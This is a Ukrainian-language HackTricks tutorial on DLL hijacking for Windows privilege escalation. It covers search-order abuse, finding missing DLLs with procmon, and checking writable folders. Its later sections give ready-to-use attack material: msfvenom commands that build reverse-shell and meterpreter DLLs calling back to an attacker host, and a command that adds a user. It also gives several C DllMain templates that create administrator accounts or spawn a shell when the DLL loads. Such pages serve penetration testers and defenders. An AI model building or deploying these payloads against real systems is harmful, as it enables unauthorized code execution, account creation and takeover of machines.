# Dll Hijacking

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Дізнайтеся про [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Підказка щодо багів у винагороді**: **зареєструйтеся** на **Intigriti**, преміальній **платформі для багів, створеній хакерами для хакерів**! Приєднуйтесь до нас на [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) сьогодні, і почніть заробляти винагороди до **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Основна інформація

Викрадення DLL включає маніпулювання довіреною програмою для завантаження шкідливої DLL. Цей термін охоплює кілька тактик, таких як **підробка, ін'єкція та бокове завантаження DLL**. Це використовується головним чином для виконання коду, досягнення постійності та, менш часто, підвищення привілеїв. Незважаючи на акцент на підвищенні привілеїв тут, метод викрадення залишається стійким незалежно від цілей.

### Загальні техніки

Для викрадення DLL використовуються кілька методів, кожен з яких має свою ефективність в залежності від стратегії завантаження DLL програми:

1. **Заміна DLL**: Заміна справжньої DLL на шкідливу, за необхідності використовуючи Підробку DLL для збереження функціональності оригінальної DLL.
2. **Викрадення порядку пошуку DLL**: Розміщення шкідливої DLL у шляху пошуку перед законною, використовуючи шаблон пошуку програми.
3. **Викрадення фантомної DLL**: Створення шкідливої DLL для завантаження програмою, вважаючи, що це невідома необхідна DLL.
4. **Перенаправлення DLL**: Зміна параметрів пошуку, таких як `%PATH%` або файли `.exe.manifest` / `.exe.local`, щоб спрямувати програму на шкідливу DLL.
5. **Заміна DLL у WinSxS**: Заміна законної DLL на шкідливий еквівалент у каталозі WinSxS, метод часто пов'язаний з боковим завантаженням DLL.
6. **Викрадення DLL за відносним шляхом**: Розміщення шкідливої DLL у каталозі, котрий контролюється користувачем, разом з копійованою програмою, нагадуючи техніки виконання бінарних проксі.

## Пошук відсутніх DLL

Найпоширеніший спосіб знайти відсутні DLL у системі - запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) від sysinternals, **встановивши** наступні **2 фільтри**:

![](<../../../.gitbook/assets/image (311).png>)

![](<../../../.gitbook/assets/image (313).png>)

і просто показати **Активність файлової системи**:

![](<../../../.gitbook/assets/image (314).png>)

Якщо ви шукаєте **відсутні DLL загалом**, ви **залишаєте** це працюючим протягом декількох **секунд**.\
Якщо ви шукаєте **відсутню DLL у конкретному виконуваному файлі**, вам слід встановити **інший фільтр, наприклад "Ім'я процесу" "містить" "<ім'я виконуваного файлу>", виконати його і зупинити захоплення подій**.

## Використання відсутніх DLL

Для підвищення привілеїв найкращий шанс - мати можливість **записати DLL, яку привілейований процес спробує завантажити** в якомусь **місці, де її буде шукати**. Тому ми зможемо **записати** DLL у **каталозі**, де **DLL шукається перед** каталогом, де знаходиться **оригінальна DLL** (дивний випадок), або ми зможемо **записати у каталозі, де буде шукатися DLL**, а оригінальна **DLL не існує** у жодному каталозі.

### Порядок пошуку DLL

У [**документації Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **можна знайти, як саме завантажуються DLL**.

**Windows-додатки** шукають DLL, слідуючи набору **передбачених шляхів пошуку**, дотримуючись певної послідовності. Проблема викрадення DLL виникає, коли шкідлива DLL стратегічно розміщується в одному з цих каталогів, щоб гарантувати, що вона завантажиться перед автентичною DLL. Рішення для запобігання цьому - переконатися, що програма використовує абсолютні шляхи при посиланні на необхідні DLL.

Ви можете побачити **порядок пошуку DLL на 32-бітних** системах нижче:

1. Каталог, з якого завантажено додаток.
2. Системний каталог. Використовуйте функцію [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), щоб отримати шлях до цього каталогу.(_C:\Windows\System32_)
3. 16-бітний системний каталог. Немає функції, яка отримує шлях до цього каталогу, але він шукається. (_C:\Windows\System_)
4. Каталог Windows. Використовуйте функцію [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), щоб отримати шлях до цього каталогу.
5. (_C:\Windows_)
6. Поточний каталог.
7. Каталоги, які перераховані в змінній середовища PATH. Зверніть увагу, що це не включає шлях, вказаний для кожного додатка за допомогою ключа реєстру **App Paths**. Ключ **App Paths** не використовується при обчисленні шляху пошуку DLL.

Це **стандартний** порядок пошуку з увімкненим **SafeDllSearchMode**. Коли він вимкнений, поточний каталог піднімається на друге місце. Щоб вимкнути цю функцію, створіть значення реєстру **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** та встановіть його на 0 (за замовчуванням увімкнено).

Якщо [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликається з **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, пошук починається в каталозі виконавчого модуля, який завантажує **LoadLibraryEx**.

На завершення, слід зауважити, що **DLL може бути завантажена, вказавши абсолютний шлях замість просто імені**. У цьому випадку DLL **буде шукатися лише в цьому шляху** (якщо у DLL є залежності, вони будуть шукатися за іменем, що їх завантажено).

Є інші способи змінити порядок пошуку, але я не буду пояснювати їх тут.

#### Виключення у порядку пошуку DLL з документації Windows

Деякі виключення зі стандартного порядку пошуку DLL відзначені в документації Windows:

* Коли зустрічається **DLL, яка має ту саму назву, що й одна з уже завантажених у пам'ять**, система обходить звичайний пошук. Замість цього вона виконує перевірку на перенаправлення та маніфест перед тим, як використовувати DLL, яка вже є в пам'яті. **У цьому випадку система не виконує пошук DLL**.
* У випадках, коли DLL визнана як **відома DLL** для поточної версії Windows, система використовуватиме свою версію відомої DLL, разом з будь-якими залежними DLL, **пропускаючи процес пошуку**. Ключ реєстру **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** містить список цих відомих DLL.
* Якщо у DLL є **залежності**, пошук цих залежних DLL виконується так, ніби вони були вказані лише за їх **іменами модулів**, незалежно від того, чи було початкову DLL ідентифіковано за повним шляхом.

### Підвищення привілеїв

**Вимоги**:

* Визначте процес, який працює або буде працювати під **різними привілеями** (горизонтальний або бічний рух), якому **не вистачає DLL**.
* Переконайтеся, що є **права на запис** для будь-якого **каталогу**, в якому буде **шукатися DLL**. Це може бути каталог виконавчого файлу або каталог у системному шляху.

Так, вимоги складно знайти, оскільки **за замовчуванням досить дивно знайти привілейований виконавчий файл, у якого відсутня DLL**, і ще **дивніше мати права на запис у каталозі системного шляху** (зазвичай цього не можна зробити). Але в неправильно налаштованих середовищах це можливо.\
У випадку, якщо ви щасливчик і відповідаєте вимогам, ви можете перевірити проект [UACME](https://github.com/hfiref0x/UACME). Навіть якщо **основна мета проекту - обхід UAC**, ви там можете знайти **PoC** для перехоплення DLL для версії Windows, яку ви можете використовувати (імовірно, просто змінивши шлях каталогу, де у вас є права на запис).

Зверніть увагу, що ви можете **перевірити свої дозволи в каталозі**, виконавши:

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

І **перевірте дозволи на всі папки всередині ШЛЯХУ**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Ви також можете перевірити імпорти виконуваного файлу та експорти dll за допомогою:

```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Для повного посібника з **зловживання Dll Hijacking для підвищення привілеїв** з дозволом на запис у папці **System Path** перевірте:

{% content-ref url="writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Автоматизовані інструменти

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) перевірить, чи є у вас права на запис у будь-якій папці всередині системного шляху.\
Інші цікаві автоматизовані інструменти для виявлення цієї вразливості - це функції **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ та _Write-HijackDll._

### Приклад

У випадку виявлення ситуації, яку можна використати для атаки, одним з найважливіших аспектів успішної експлуатації буде **створення dll, яка експортує принаймні всі функції, які виконуваний файл буде імпортувати з неї**. У будь-якому випадку, слід зауважити, що Dll Hijacking допомагає [підвищити рівень середовища від середнього до високого **(обхід UAC)**](../../authentication-credentials-uac-and-efs/#uac) або з [**високого рівня до SYSTEM**](../#from-high-integrity-to-system)**.** Ви можете знайти приклад **створення дійсної dll** у цьому дослідженні зосередженому на Dll Hijacking для виконання: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Більше того, у **наступному розділі** ви можете знайти деякі **основні коди dll**, які можуть бути корисними як **шаблони** або для створення **dll з експортом функцій, які не потрібні**.

## **Створення та компіляція Dlls**

### **Проксіфікація Dll**

Основна ідея **проксі-бібліотеки Dll** полягає в тому, що вона може **виконувати ваш шкідливий код при завантаженні**, а також **виконувати** та **працювати** як **вимагається**, **перенаправляючи всі виклики до реальної бібліотеки**.

За допомогою інструментів [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) ви можете **вказати виконавчий файл та вибрати бібліотеку**, яку ви хочете проксіфікувати та **створити проксіфіковану dll** або **вказати Dll** та **створити проксіфіковану dll**.

### **Meterpreter**

**Отримати обернену оболонку (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Отримати meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Створення користувача (x86 я не бачив версії x64):**

```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Ваш власний

Зверніть увагу, що у декількох випадках Dll, який ви компілюєте, повинен **експортувати кілька функцій**, які будуть завантажені жертовним процесом, якщо ці функції не існують, **бінарний файл не зможе їх завантажити**, і **експлойт не вдасться**.

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```

## Посилання

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Підказка щодо винагороди за виявлення помилок**: **зареєструйтесь** на **Intigriti**, преміальній **платформі для виявлення помилок, створеній хакерами для хакерів**! Приєднуйтесь до нас на [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) сьогодні, і почніть заробляти винагороди до **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити свою **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний мерч PEASS & HackTricks**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв GitHub**.

</details>
